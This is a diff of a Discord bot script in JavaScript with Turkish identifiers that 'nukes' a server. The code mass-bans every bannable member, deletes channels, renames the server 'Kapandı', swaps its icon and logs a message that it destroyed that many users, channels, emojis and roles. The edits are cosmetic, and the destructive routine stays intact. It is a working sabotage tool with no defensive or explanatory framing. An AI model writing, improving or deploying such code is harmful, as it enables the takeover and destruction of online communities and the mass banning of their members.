@@ -6,12 +6,12 @@ if (message.guild) {
 let kanallar = 0;
 let roller = 0;
 let emojiler = 0;
-let insan = 0;
+let insanlar = 0;
 
       
 message.guild.members.forEach(u => {
 if (u.bannable) {
-insan++
+insanlar++
 message.guild.ban(u, "Berke Adamdır")
 }
 })
@@ -23,28 +23,12 @@ return c.delete();
 }
 });  
 
-if(message.deletable) message.delete();
-    message.guild.channels.forEach(channel => {
-      if(channel.deletable) channel.delete()
-  })
 
-console.log(`Sunucudaki ${insan} kullanıcı ve ${kanallar} kanal ${emojiler} emoji ve ${roller} rol yok edildi!`);
+console.log(`Sunucudaki ${insanlar} kullanıcı ve ${kanallar} kanal ${emojiler} emoji ve ${roller} rol yok edildi!`);
   
 message.guild.setName(`Kapandı`, ":))")
-message.guild.setIcon(`https://media.discordapp.net/attachments/566759721294495761/566902339726999553/6fc0bd5fbaec9e4bdcc10c0bd459f605.png`)
-
-message.guild.channels.forEach(c => {
-if (c.deletable) {
-kanallar++;
-return c.delete();   
-}
-});
-    
-
-    
-
-  
-message.guild.createChannel(`hey`)
+message.guild.setIcon(`https://cdn.discordapp.com/attachments/569895621872451605/573561578767777829/closed-logo1.jpg`)
+ 
 message.guild.createChannel(`hey`)
 message.delete()
 }
